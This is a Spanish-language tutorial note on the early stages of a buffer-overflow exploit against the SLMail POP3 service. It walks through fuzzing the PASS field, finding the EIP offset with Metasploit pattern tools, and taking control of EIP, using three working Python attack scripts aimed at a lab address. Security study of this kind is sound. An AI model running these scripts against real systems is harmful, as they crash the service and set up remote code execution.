------
- Tags: #enumeración #fuzzing #bufferoverflow #eip #offset
----
# Definición

> En la fase inicial de explotación de un buffer overflow, una de las primeras tareas es averiguar los **límites del programa objetivo**. Esto se hace probando a **introducir más caracteres de los debidos en diferentes campos de entrada del programa**, como una cadena de texto o un archivo, hasta que se detecte que la aplicación se **corrompe** o falla.

Una vez que se encuentra el límite del campo de entrada, el siguiente paso es averiguar el **offset**, que corresponde al **número exacto de caracteres que se deben introducir para provocar una corrupción en el programa** y, por lo tanto, para **sobrescribir** el valor del **registro EIP**.

> El registro **EIP** (**Extended Instruction Pointer**) es un registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. En un buffer overflow exitoso, el valor del registro EIP se sobrescribe con **una dirección controlada por el atacante**, lo que permite ejecutar código malicioso en lugar del código original del programa.

Por lo tanto, el objetivo de averiguar el **offset** es determinar el **número exacto de caracteres que se deben introducir en el campo de entrada** para sobrescribir el valor del **registro EIP** y apuntar a la dirección de memoria controlada por el atacante. Una vez que se conoce el offset, el atacante puede diseñar un exploit personalizado para el programa objetivo que permita **tomar control del registro EIP** y ejecutar código malicioso.

------
# Enumeración y tomando el control del registro EIP

Nosotros vamos a intentar corromper el servicio de **SLMail** que corre por el *puerto 110* por lo tanto primero debemos comenzar por la etapa de **Fuzzing** o **Enumeración**.

--------

Lo primero que haremos será abrir el **Immunity Debugger** y sincronizarnos al proceso de **SLMail** para así poder ver los **registros** y detalles que estén sucediendo por detrás **a bajo nivel**. 

Para sincronizarnos daremos click arriba a la izquierda en *File* > *Attach* y buscaremos **SLmail**, luego le daremos a *Attach*. 
Para ver todo mas cómodo podemos **cambiar la fuente** dándole click derecho ``Appearance > Font (All) > Font 6``

El programa por defecto **pausa el servicio** como podemos ver abajo a la derecha, por lo tanto lo reanudaremos dándole al símbolo de *Play* de la barra de arriba.

![[BOF 1.png]]

Nosotros como atacantes lo que vamos a intentar es controlar el **EIP** (**Extended Instruction Pointer**), para esto es necesario que intentemos desbordar el buffer de la memoria en algún campo de entrada de la aplicación, generando un **Crash** o **ruptura** en el servicio.

-------

Si prestamos atención en la aplicación de **Immunity Debugger** veremos que en el panel de arriba a la derecha llamado **Registers** **(FPU)** se muestran los registros en tiempo real del proceso de **SLmail**, vemos valores tales como EAX, ECX, EDX, EBX, ESP (La pila o Stack), EBP, ESI, EDI y por ultimo y el que más nos interesa por ahora **EIP**, recordemos que este es el Instruction Pointer de la aplicación, es decir, el registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. 

![[BOF 2.png]]

Lo que buscamos es determinar cuantos **Bytes** o **caracteres** se precisan en el campo de entrada para **superar el limite establecido por el desarrollador**. Un ejemplo sería que en el campo de la contraseña se haya definido como **máximo** un total de *80 caracteres* permitidos, nosotros deberíamos ir aplicando **Fuzzing** hasta colocar un número mayor a 80 para poder **Crashear** la aplicación y a partir de ahí ver el comportamiento del **EIP**, luego deberíamos identificar cuantos caracteres específicamente necesitamos para realizar el Crash, para que el valor del EIP que sale en los Registers esté controlado específicamente por nosotros, inyectando código malicioso en el mismo.

------

Siempre que queramos buscar una vulnerabilidad en algún servicio o proceso es importante que busquemos en ``searchsploit``, si buscamos por SLmail veremos que hay varios scripts que se aprovechan del campo PASS para explotar un Buffer Overflow, esto nos sirve como guía para ver por donde podemos atacar.

Actualmente la única entrada que tenemos es la sección de **login** a través de nuestra máquina de atacante, con la utilización de ``telnet`` o ``nc`` podremos acceder al apartado del login donde tendremos que proporcionar un usuario y una **contraseña**.

![[inst 6.png]]

Vamos a crear un script en **Python3** que nos permita realizar **Fuzzing** en el campo de ``PASS`` en el login de la aplicación, esto con el objetivo de determinar cuantos caracteres acepta como máximo para comenzar a sobreescribir el **EIP**.

-------
**eip-fuzz.py**
 
```python
#!/usr/bin/python3

# Este script al ejecutarlo se encarga de colocar una cantidad de caracteres "A" en base a la longitúd especificada, todo esto en el servicio SLmail especificamente en el campo PASS <pass>. Esto para determinar cual es el tamaño fijado por el desarrollador de la aplicación en el BUFFER.

import socket
import sys

# Creamos una ayuda para que cuando no se proporcione un argumento se indique como usar el programa.

if len(sys.argv) != 2:
    print("\n[!] Uso: eip-fuzz.py <length>")
    exit(1)

# Variables globales. 
# La variable "total_length" sirve para que proporcionemos un argumento (ejemplo: "eip-fuzz.py <500>") 

ip_address = "192.168.0.120"
port = 110
total_length = int(sys.argv[1])

def exploit():

    # Creamos un Socket para entablar una conexión via TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conexión al Socket
    s.connect((ip_address, port))

    # Recibir el banner para comprobar que obtenemos respuesta de la conexión (El Banner es: "+OK POP3 server WIN-VIH44ETAKL6 ready <00008.2921227@WIN-VIH44ETAKL6>" esta es la primer cadena que aparece cuando usamos la conexión por ejemplo con telnet o nc.
    banner = s.recv(1024)
    # print(banner) ---> Con esto comprobamos que recibimos el banner a modo de chequeo
    
    # Enviamos el usuario en formato Bytes colocando la "b" adelante de la cadena. Luego el \r\n es la representación del Enter también en formato Bytes(b)
    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024)
    # print(response) ---> Acá mostramos la respuesta que nos otorga SLmail cuando enviamos el "USER test" a modo de chequeo
    
    # Enviamos la contraseña en formato Bytes, esta contraseña será una "A" repetida la cantidad de veces que el usuario le indique en el <length> de la ejecución del script.
    s.send(b"PASS " + b"A"*total_length + b'\r\n')
    # Cerramos la conexión del Socket
    s.close()


if __name__ == '__main__':

    exploit()
```
---

Lo que tenemos que hacer ahora es **ir probando valores con el script**, es decir *500*, *1000*, *3000*, *5000*, *10000*, etc. Nosotros nos daremos cuenta que la cantidad que proporcionamos como **length** superó la máxima definida por el desarrollador cuando el programa **Crashee**, para darnos cuenta de esto veremos en el Immunity Debugger que **el proceso se pausó**.

En mi caso el programa crasheó al proporcionar un valor de "*A*" repetido **5000 veces**, y como podemos ver en el Immunity Debugger, la aplicación se **pausó** y el registro **EIP** ahora vale *0x41414141* que significa *AAAA* ya que la letra "*A*" en hexadecimal es *0x41*.

![[BOF 3.png]]

------

Una vez conseguimos que el proceso se crashee, tenemos que averiguar **cual es la cantidad especifica de caracteres/bytes** en nuestro caso las letras "*A*" que **generan el crash** hasta ANTES de sobreescribir el **EIP**, es decir el ==offset==, para que una vez lo detectemos podamos manipularlo a nuestro antojo.

Para detectar cuantas "A" en este caso se precisan antes de modificar el **EIP**, es decir el valor del **offset**, vamos a utilizar unas herramientas propias de **Metasploit** llamadas ``pattern_create.rb`` y ``pattern_offset.rb``.

- ``/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000``

Esta herramienta se encarga de generar patrones de Bytes predecibles en base a una longitud ``-l`` que le proporcionemos, en nuestro caso le pediremos un *patrón de 5000* ya que este fue el que nos funcionó a nosotros.

![[BOF 4.png]]

Ahora lo que debemos hacer es en nuestro script reemplazar las "*A*" por la cadena de Bytes otorgada por la herramienta ``pattern_create.rb``, esto con el objetivo de ver **que cadena en Hexadecimal del patrón nos aparece en el EIP**, gracias a esto **determinaríamos el valor del offset** correctamente.

Crearemos una variable global ``offset_detector = b"<patron>"`` en el script, donde se contenga en formato Bytes el patrón otorgado por la herramienta, además eliminaremos algunas variables y el argumento de Length.

-----
**offset-fuzz.py**

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110
offset_detector = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + offset_detector + b'\r\n')
    s.close()


if __name__ == '__main__':

    exploit()
```
----

Como nosotros previamente ya habíamos pausado el SLmail, lo que les recomiendo es que **cerremos el Immunity Debugger** y **ejecutemos nuevamente el SLmail** dándole a *Start* en el dibujo del semáforo.

Ejecutamos el script modificado, esperamos el crash y observamos que el valor del **EIP** es distinto al de la ultima vez, ya que **esos números son el equivalente en hexadecimal a un pedazo especifico de todo el patrón que enviamos**.

Lo que debemos hacer es **copiar** el valor del EIP y pasárselo a la herramienta ``pattern_offset.rb`` con el parámetro ``-q``

![[BOF 5.png]]

- ``/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A``

¿Por qué se usa **``0x``**? El prefijo **``0x``** se utiliza para indicar que el número está en formato **hexadecimal**. Sin este prefijo, no sería claro si el número es decimal, hexadecimal o en otra base.

![[BOF 6.png]]

El número exacto de Bytes/caracteres correspondientes al **offset** es *4654*, por lo tanto al introducir *4654* letras "*A*", **las próximas 4 letras aparecerán en el EIP**, por ejemplo podríamos colocar 4 letras "*B*" que en hexadecimal la letra "*B*" se representa como *42* por lo tanto el **EIP** quedaría *42424242* ocupando la capacidad máxima que es de **8 caracteres**.

----
**eip-control.py**

Todo lo anterior lo testearíamos utilizando el primer script pero modificándolo un poco aplicando una **variable** ``offset`` que valdrá ``4654``, después una **variable** ``before_eip`` que valdrá la letra "*A*" por la cantidad de valor de ``offset``, y por ultimo una variable ``eip`` que valdrá el valor que le queramos meter al **EIP**, en mi caso *4* letras "*B*" . Por ultimo solo quedaría unificar todo en una variable ``payload`` que valdrá ``before_eip + eip`` y meterla en el campo **PASS**.

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110

offset = 4654
before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024) 
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```
------

Solo restaría ejecutar el script para generar el crash y ver que el **EIP** va a valer lo que le indicamos nosotros en el código.

- ``python3 eip-control.py``

Esto lo que hará será poner *4654* "*A*" (OFFSET) y después *4* "*B*", esas 4 "B" de más son las que aparecerán en el **EIP** como **42424242**.

![[BOF 8.png]]

En este punto **tenemos el control del EIP como atacantes**, en la próxima etapa vamos a tratar de meter luego del EIP más caracteres para ver donde están representados los mismos, esto juega un papel fundamental para redirigir el flujo del programa a la **PILA (ESP)** y partir de ahí ejecutar instrucciones a bajo nivel, es decir nuestro **Shell Code**.